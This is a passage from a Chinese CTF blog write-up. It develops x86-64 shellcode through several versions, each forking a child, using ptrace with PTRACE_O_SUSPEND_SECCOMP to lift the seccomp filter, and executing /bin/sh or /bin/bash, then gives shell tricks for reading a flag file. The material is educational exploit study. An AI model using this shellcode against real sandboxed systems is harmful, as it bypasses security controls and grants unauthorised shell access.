class="literal">NULL</span>)</span><br><span class="line">    mov rax, <span class="number">59</span>         ; syscall number <span class="keyword">for</span> <span class="title function_">execve</span><span class="params">()</span></span><br><span class="line">    push 0              ; <span class="literal">NULL</span> <span class="keyword">for</span> envp</span><br><span class="line">    push <span class="number">0</span>              ; <span class="literal">NULL</span> <span class="keyword">for</span> argv</span><br><span class="line">    mov rbx, <span class="number">0x68732f6e69622f</span> ; <span class="string">&quot;/bin//sh&quot;</span> in reverse</span><br><span class="line">    push rbx            ; push the address of <span class="string">&quot;/bin//sh&quot;</span> onto the <span class="built_in">stack</span></span><br><span class="line">    mov rdi, rsp        ; pointer to the argument <span class="built_in">array</span></span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; Exit <span class="keyword">if</span> execve fails</span><br><span class="line">    mov rax, <span class="number">60</span>         ; syscall number <span class="keyword">for</span> <span class="title function_">exit</span><span class="params">()</span></span><br><span class="line">    xor rdi, rdi        ; status</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>去注释版本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">    mov rax, <span class="number">57</span></span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax</span><br><span class="line">    mov r15, rax</span><br><span class="line">    jz child_process</span><br><span class="line"></span><br><span class="line">parent_process:</span><br><span class="line">    mov rax, <span class="number">7</span></span><br><span class="line">    mov rdi, r15</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">257</span></span><br><span class="line">    mov rdi, <span class="number">16</span></span><br><span class="line">    mov rsi, r15</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">257</span></span><br><span class="line">    mov rdi, <span class="number">0x42000003</span></span><br><span class="line">    mov rsi, r15</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">257</span></span><br><span class="line">    mov rdi, <span class="number">0x7</span></span><br><span class="line">    mov rsi, r15</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">60</span></span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">child_process:</span><br><span class="line">    mov rax, <span class="number">257</span></span><br><span class="line">    mov rdi, <span class="number">0</span></span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">59</span></span><br><span class="line">    push <span class="number">0</span></span><br><span class="line">    push <span class="number">0</span></span><br><span class="line">    mov rbx, <span class="number">0x68732f6e69622f</span></span><br><span class="line">    push rbx</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">60</span></span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p>如果只是这样shellcode没有达到想要的结果<img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726211709806-93e54516-2188-475d-b6d6-26cbd6a1af77.png" alt="img"></p>
<p>因为我们的TRACEME和ATTCH实际上取得的是同一个效果，我看Qanux爷的exp，它让子进程sleep了一段时间，我们据此进行改进</p>
<h3 id="shellcode-v-2"><a href="#shellcode-v-2" class="headerlink" title="shellcode v.2"></a>shellcode v.2</h3><p>实际上对子进程的监测和管理都是放在一个死循环里的，我们得往shellcode代码里面加一个死循环</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pid = fork()</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!pid)</span><br><span class="line">    &#123;<span class="comment">//子进程</span></span><br><span class="line">        nanosleep(&amp;[<span class="number">5</span>,<span class="number">1</span>],<span class="number">0</span>)</span><br><span class="line">        execve(<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//父进程</span></span><br><span class="line">        waitpid(pid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        ptrace(PTRACE_ATTACH,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">        ptrace(PTRACE_O_SUSPEND_SECCOMP,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">        ptrace(PTRACE_CONT,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应的shellcode如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">    mov rax, <span class="number">57</span></span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax</span><br><span class="line">    mov r15, rax</span><br><span class="line">    jz child_process</span><br><span class="line"></span><br><span class="line">parent_process:</span><br><span class="line">    mov rax, <span class="number">7</span></span><br><span class="line">    mov rdi, r15</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">101</span></span><br><span class="line">    mov rdi, <span class="number">16</span></span><br><span class="line">    mov rsi, r15</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">monitor_child:</span><br><span class="line">    mov rax, <span class="number">101</span></span><br><span class="line">    mov rdi, <span class="number">0x42000003</span></span><br><span class="line">    mov rsi, r15</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">101</span></span><br><span class="line">    mov rdi, <span class="number">0x7</span></span><br><span class="line">    mov rsi, r15</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    syscall</span><br><span class="line">	jmp monitor_child</span><br><span class="line"></span><br><span class="line">child_process:</span><br><span class="line">    mov rax,<span class="number">35</span></span><br><span class="line">    push <span class="number">1</span></span><br><span class="line">    dec byte ptr [rsp]</span><br><span class="line">    push <span class="number">5</span></span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    mov rax, <span class="number">59</span></span><br><span class="line">    mov rbx, <span class="number">0x68732f6e69622f</span></span><br><span class="line">    push rbx</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    jmp child_process</span><br><span class="line">    mov rax, <span class="number">60</span></span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>

<p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726212749197-6b4ebf41-fb80-4677-a0a3-5d0bfe0553e9.png" alt="img"></p>
<p>虽然是有shell的提示但是输入指令是没有回显的，比如echo *都没有回显</p>
<h3 id="shellcode-v-3"><a href="#shellcode-v-3" class="headerlink" title="shellcode v.3"></a>shellcode v.3</h3><p>再次对比Qanux的exp，发现用的是&#x2F;bin&#x2F;bash\x00。</p>
<p>然后发现wait是在PTRACE_ATTACH之后才调用的，调整下顺序，果然出了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">order2 = b<span class="number">&#x27;</span>h\x00<span class="number">&#x27;</span>[::<span class="number">-1</span>].hex()</span><br><span class="line">order1 = b<span class="number">&#x27;</span>/bin/bas<span class="number">&#x27;</span>[::<span class="number">-1</span>].hex()</span><br><span class="line">shellcode=<span class="keyword">asm</span>(f<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    mov rax, 57</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    test rax,rax</span></span><br><span class="line"><span class="string">    mov r15, rax</span></span><br><span class="line"><span class="string">    cmp rax, 0</span></span><br><span class="line"><span class="string">    je child_process</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">parent_process:</span></span><br><span class="line"><span class="string">    mov rax, 101</span></span><br><span class="line"><span class="string">    mov rdi, 16</span></span><br><span class="line"><span class="string">    mov rsi, r15</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rax, 61</span></span><br><span class="line"><span class="string">    mov rdi, r15</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    xor r10,r10</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">monitor_child:</span></span><br><span class="line"><span class="string">    mov rax, 101</span></span><br><span class="line"><span class="string">    mov rdi, 0x4200</span></span><br><span class="line"><span class="string">    mov rsi, r15</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov r10, 0x00000080</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 101</span></span><br><span class="line"><span class="string">    mov rdi, 0x7</span></span><br><span class="line"><span class="string">    mov rsi, r15</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    xor r10, r10</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">	jmp monitor_child</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">child_process:</span></span><br><span class="line"><span class="string">    mov rax,35</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    dec byte ptr [rsp]</span></span><br><span class="line"><span class="string">    push 5</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rax, 59</span></span><br><span class="line"><span class="string">    mov rbx,0x&#123;order2&#125; </span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rbx, 0x&#123;order1&#125; </span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    jmp child_process</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>对应的伪代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pid = fork()</span><br><span class="line">ptrace(PTRACE_ATTACH,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">waitpid(pid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!pid)</span><br><span class="line">    &#123;<span class="comment">//子进程</span></span><br><span class="line">        ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        execve(<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//父进程</span></span><br><span class="line">        ptrace(PTRACE_SETOPTIONS,pid,<span class="number">0</span>,PTRACE_O_SUSPEND_SECCOMP)</span><br><span class="line">        ptrace(PTRACE_CONT,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726214096416-98d3111d-f787-43c9-9d9c-0f0766b4dae1.png" alt="img"></p>
<p>在Q爷文章中最后提到，给出的shell并没有ls和cat的功能，但是可以用对应代码代替</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># ls</span></span><br><span class="line">echo *</span><br><span class="line"></span><br><span class="line"><span class="meta"># cat flag</span></span><br><span class="line"><span class="keyword">while</span> IFS = read -r line; </span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    echo <span class="string">&quot;$line&quot;</span></span><br><span class="line">done &lt; flag</span><br></pre></td></tr></table></figure>

<p>最后</p>
<p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726214453067-8e33a529-ea32-4953-bdab-46d9de921250.png" alt="img"></p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>xswlhhh
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://example.com/2024/10/28/%E7%B4%AB%E7%A6%81%E5%9F%8E%E4%B9%8B%E6%AE%87/" title="紫禁城之殇">http://example.com/2024/10/28/紫禁城之殇/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

	
      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E8%BF%9B%E7%A8%8B/" rel="tag"># 进程</a>
              <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%9F%A5%E8%AF%86/" rel="tag"># 二进制知识</a>
              <a href="/tags/ctf/" rel="tag"># ctf</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/03/29/%E3%80%8A%E7%A8%8B%E5%BA%8F%E5%91%98%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93%E3%80%8B%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E8%A3%85%E8%BD%BD%E4%B8%8E%E8%BF%9B%E7%A8%8B-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" rel="prev" title="《程序员自我修养-链接、装载与库》第六章 可执行文件的装载与进程 读书笔记">
      <i class="fa fa-chevron-left"></i> 《程序员自我修养-链接、装载与库》第六章 可执行文件的装载与进程 读书笔记
    </a></div>
      <div class="post-nav-item">
    <a href="/2024/10/28/XSCTF2023/" rel="next" title="XSCTF2023">
      XSCTF2023 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    
  <div class="comments">
    <div id="lv-container" data-id="city" data-uid="MTAyMC81OTY4MS8zNjE0Mw=="></div>
  </div>
  

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">
	<!--网易云插件-->
	<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=489847882&auto=1&height=66"></iframe>

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x1-%E4%BB%8EC%E5%87%BD%E6%95%B0%E8%B5%B0%E8%BF%9B%E5%AD%90%E8%BF%9B%E7%A8%8B"><span class="nav-number">1.</span> <span class="nav-text">0x1 从C函数走进子进程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E8%BF%9B%E7%A8%8B%E6%9C%89%E5%85%B3%E6%A6%82%E5%BF%B5"><span class="nav-number">1.1.</span> <span class="nav-text">1.1 进程有关概念</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-1-%E8%BF%9B%E7%A8%8B"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.1.1 进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-2-%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="nav-number">1.1.2.</span> <span class="nav-text">1.1.2 进程和线程的区别？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-%E4%BB%8EC%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E5%87%BA%E5%8F%91"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 从C语言函数出发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-1-%E8%8E%B7%E5%8F%96%E8%BF%9B%E7%A8%8BID"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.2.1 获取进程ID</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-2-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B"><span class="nav-number">1.2.2.</span> <span class="nav-text">1.2.2 创建进程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-2-1-fork"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">1.2.2.1 fork</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-2-2-vfork"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">1.2.2.2 vfork</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-2-3-clone"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">1.2.2.3 clone()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-%E5%87%BA%E5%8F%91%E7%9A%84%E8%BD%AC%E6%8A%98%E7%82%B9"><span class="nav-number">1.3.</span> <span class="nav-text">1.3 出发的转折点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-4-%E9%94%80%E6%AF%81%E8%BF%9B%E7%A8%8B"><span class="nav-number">1.4.</span> <span class="nav-text">1.4 销毁进程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-1-%E4%B8%BB%E5%8A%A8"><span class="nav-number">1.4.1.</span> <span class="nav-text">1.4.1 主动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-2-%E8%A2%AB%E5%8A%A8"><span class="nav-number">1.4.2.</span> <span class="nav-text">1.4.2 被动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-3-%E9%97%AE%E9%A2%98"><span class="nav-number">1.4.3.</span> <span class="nav-text">1.4.3 问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-5-system%E5%92%8Cexec"><span class="nav-number">1.5.</span> <span class="nav-text">1.5 system和exec</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-1-system%E5%90%AF%E5%8A%A8%E4%B8%80%E4%B8%AA%E6%96%B0%E8%BF%9B%E7%A8%8B"><span class="nav-number">1.5.1.</span> <span class="nav-text">1.5.1 system启动一个新进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-5-2-%E8%BF%9B%E7%A8%8B%E6%9B%BF%E6%8D%A2%EF%BC%8Cexec%E5%87%BD%E6%95%B0%E6%97%8F"><span class="nav-number">1.5.2.</span> <span class="nav-text">1.5.2 进程替换，exec函数族</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-6-wait%E4%B8%8Eptrace"><span class="nav-number">1.6.</span> <span class="nav-text">1.6 wait与ptrace</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-1-wait"><span class="nav-number">1.6.1.</span> <span class="nav-text">1.6.1 wait</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-6-1-1-pid-t-wait-int-status"><span class="nav-number">1.6.1.1.</span> <span class="nav-text">1.6.1.1 pid_t wait(int *status);</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-6-1-2-pid-t-waitpid-pid-t-pid-int-status-int-options"><span class="nav-number">1.6.1.2.</span> <span class="nav-text">1.6.1.2 pid_t waitpid(pid_t pid, int *status, int options);</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-6-1-3-wstatus%E7%8A%B6%E6%80%81"><span class="nav-number">1.6.1.3.</span> <span class="nav-text">1.6.1.3 wstatus状态</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-2-ptrace"><span class="nav-number">1.6.2.</span> <span class="nav-text">1.6.2 ptrace</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-6-2-1-ptrace%E5%87%BD%E6%95%B0%E8%A7%A3%E6%9E%90"><span class="nav-number">1.6.2.1.</span> <span class="nav-text">1.6.2.1 ptrace函数解析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-6-2-2-%E5%8A%9F%E8%83%BD%E8%AF%A6%E7%BB%86%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.6.2.2.</span> <span class="nav-text">1.6.2.2 功能详细描述</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-6-2-2-1-%E5%8E%9F%E6%9D%A5"><span class="nav-number">1.6.2.2.1.</span> <span class="nav-text">1.6.2.2.1 原来</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-6-2-2-2-I386"><span class="nav-number">1.6.2.2.2.</span> <span class="nav-text">1.6.2.2.2 I386</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-6-3-%E8%BF%9B%E7%A8%8B%E7%8A%B6%E6%80%81%E5%80%BC%E4%B8%AD%E6%AD%A2%E7%8A%B6%E6%80%81"><span class="nav-number">1.6.3.</span> <span class="nav-text">1.6.3 进程状态值中止状态</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-6-3-1-Stopped%E7%8A%B6%E6%80%81"><span class="nav-number">1.6.3.1.</span> <span class="nav-text">1.6.3.1 Stopped状态</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-6-3-2-Traced%E7%8A%B6%E6%80%81%E2%80%94%E2%80%94%E6%96%B0%E6%89%8B%E4%BE%8B%E5%AD%90"><span class="nav-number">1.6.3.2.</span> <span class="nav-text">1.6.3.2 Traced状态——新手例子</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-6-3-2-1-%E5%8F%AF%E8%83%BD%E6%9C%89%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98"><span class="nav-number">1.6.3.2.1.</span> <span class="nav-text">1.6.3.2.1 可能有的一些问题</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-6-3-2-2-USER%E5%AD%97%E6%AE%B5"><span class="nav-number">1.6.3.2.2.</span> <span class="nav-text">1.6.3.2.2 USER字段</span></a></li></ol></li><li class="nav-item nav-level-4"><a 